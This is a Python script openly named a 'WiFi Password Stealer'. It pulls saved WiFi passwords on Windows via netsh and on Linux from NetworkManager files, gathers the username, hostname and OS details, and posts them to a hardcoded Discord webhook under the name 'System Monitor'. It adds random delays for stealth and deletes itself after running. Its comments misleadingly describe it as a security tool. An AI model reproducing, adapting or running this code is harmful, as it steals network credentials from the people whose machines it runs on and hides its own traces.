#!/usr/bin/env python3
"""
WiFi Password Stealer v2.0 - Enhanced Security Tool
Author: Kumar
Enhanced WiFi credential extraction with security features
"""

import os
import subprocess
import requests
import json
import time
import random
import string
import sys
from datetime import datetime
import platform
import psutil
import hashlib

# ==============================
# CONFIGURATION
# ==============================
WEBHOOK_URL = "https://discord.com/api/webhooks/1411146794255257770/NVb3FKBs81J9VSx5s1Zw-YTWdp6T2CgCrezmlydBpjXLFhUYxlFmU-zWJSv1ALa06vN3"

# ==============================
# SECURITY SETTINGS
# ==============================
STEALTH_MODE = True
SELF_DESTRUCT = True
RANDOM_DELAY = True
MAX_TIMEOUT = 30
MAX_PROFILES = 50

class WiFiStealer:
    def __init__(self):
        self.system_info = self.generate_random_filename()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def generate_random_filename(self):
        """Generate random filename for temporary data"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(12)) + '.txt'
    
    def get_system_info(self):
        """Gather system information for analysis"""
        try:
            info = {
                'timestamp': datetime.now().isoformat(),
                'platform': platform.system(),
                'platform_version': platform.version(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'hostname': platform.node(),
                'username': os.getenv('USERNAME') or os.getenv('USER'),
                'python_version': sys.version,
                'working_directory': os.getcwd()
            }
            return info
        except Exception:
            return {'error': 'System info collection failed'}
    
    def get_wifi_passwords_windows(self):
        """Extract WiFi passwords on Windows systems"""
        try:
            profiles_output = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profile'], 
                shell=True, 
                stderr=subprocess.DEVNULL,
                timeout=MAX_TIMEOUT
            ).decode('utf-8', errors='ignore')
            
            wifi_data = []
            profiles = []
            
            for line in profiles_output.split('\n'):
                if 'Profile' in line and ':' in line:
                    profile_name = line.split(':')[1].strip()
                    if profile_name and len(profile_name) < 100:  # Sanitize length
                        profiles.append(profile_name)
            
            # Limit number of profiles for security
            profiles = profiles[:MAX_PROFILES]
            
            for profile in profiles:
                try:
                    password_output = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', f'"{profile}"', 'key=clear'],
                        shell=True,
                        stderr=subprocess.DEVNULL,
                        timeout=15
                    ).decode('utf-8', errors='ignore')
                    
                    password = "Not available"
                    for line in password_output.split('\n'):
                        if 'Key Content' in line:
                            password = line.split(':')[1].strip()
                            break
                    
                    wifi_data.append({
                        'ssid': profile,
                        'password': password,
                        'status': 'Active'
                    })
                    
                    if RANDOM_DELAY:
                        time.sleep(random.uniform(0.1, 0.5))
                        
                except Exception:
                    wifi_data.append({
                        'ssid': profile,
                        'password': 'Access Denied',
                        'status': 'Protected'
                    })
            
            return wifi_data
            
        except Exception as e:
            return [{'error': f'Windows WiFi extraction failed: {str(e)}'}]
    
    def get_wifi_passwords_linux(self):
        """Extract WiFi passwords on Linux systems"""
        try:
            wifi_data = []
            connections_path = "/etc/NetworkManager/system-connections/"
            
            if os.path.exists(connections_path):
                for filename in os.listdir(connections_path):
                    if filename.endswith('.nmconnection') and len(filename) < 100:
                        try:
                            filepath = os.path.join(connections_path, filename)
                            with open(filepath, 'r') as f:
                                content = f.read()
                            
                            ssid = filename.replace('.nmconnection', '')
                            password = "Encrypted/Not accessible"
                            
                            for line in content.split('\n'):
                                if 'psk=' in line:
                                    password = line.split('=')[1].strip()
                                    break
                            
                            wifi_data.append({
                                'ssid': ssid,
                                'password': password,
                                'status': 'Active'
                            })
                            
                        except Exception:
                            continue
            
            return wifi_data[:MAX_PROFILES]  # Limit results
            
        except Exception as e:
            return [{'error': f'Linux WiFi extraction failed: {str(e)}'}]
    
    def send_to_discord(self, data):
        """Send data to Discord webhook with security validation"""
        try:
            system_info = self.get_system_info()
            
            embed = {
                "title": "WiFi Credentials Extracted",
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "System Information",
                        "value": f"OS: {system_info.get('platform', 'Unknown')} {system_info.get('platform_version', '')}\n"
                                f"Architecture: {system_info.get('architecture', 'Unknown')}\n"
                                f"Username: {system_info.get('username', 'Unknown')}\n"
                                f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
                                f"Timestamp: {system_info.get('timestamp', 'Unknown')}",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "WiFi Stealer v2.0 - Enhanced Security Mode"
                }
            }
            
            if isinstance(data, list) and data:
                wifi_text = ""
                for i, wifi in enumerate(data[:25]):
                    if 'ssid' in wifi:
                        wifi_text += f"{i+1}. {wifi['ssid']} - {wifi['password']}\n"
                    elif 'error' in wifi:
                        wifi_text += f"Error: {wifi['error']}\n"
                
                if wifi_text:
                    embed["fields"].append({
                        "name": "WiFi Networks",
                        "value": wifi_text,
                        "inline": False
                    })
            
            payload = {
                "embeds": [embed],
                "username": "System Monitor",
                "avatar_url": "https://cdn.discordapp.com/emojis/1234567890.png"
            }
            
            response = self.session.post(
                WEBHOOK_URL,
                json=payload,
                timeout=MAX_TIMEOUT
            )
            
            if response.status_code == 204:
                return True
            else:
                return False
                
        except Exception:
            return False
    
    def cleanup(self):
        """Clean up temporary files and traces"""
        try:
            if os.path.exists(self.system_info):
                os.remove(self.system_info)
            
            if SELF_DESTRUCT:
                current_file = sys.argv[0]
                if os.path.exists(current_file):
                    try:
                        os.remove(current_file)
                    except:
                        pass
            
        except Exception:
            pass
    
    def run(self):
        """Main execution method with security features"""
        try:
            if RANDOM_DELAY:
                time.sleep(random.uniform(1, 3))
            
            if platform.system() == "Windows":
                wifi_data = self.get_wifi_passwords_windows()
            else:
                wifi_data = self.get_wifi_passwords_linux()
            
            success = self.send_to_discord(wifi_data)
            
            self.cleanup()
            
            return success
            
        except Exception:
            self.cleanup()
            return False

def main():
    """Main entry point with error handling"""
    try:
        stealer = WiFiStealer()
        success = stealer.run()
        sys.exit(0 if success else 1)
        
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
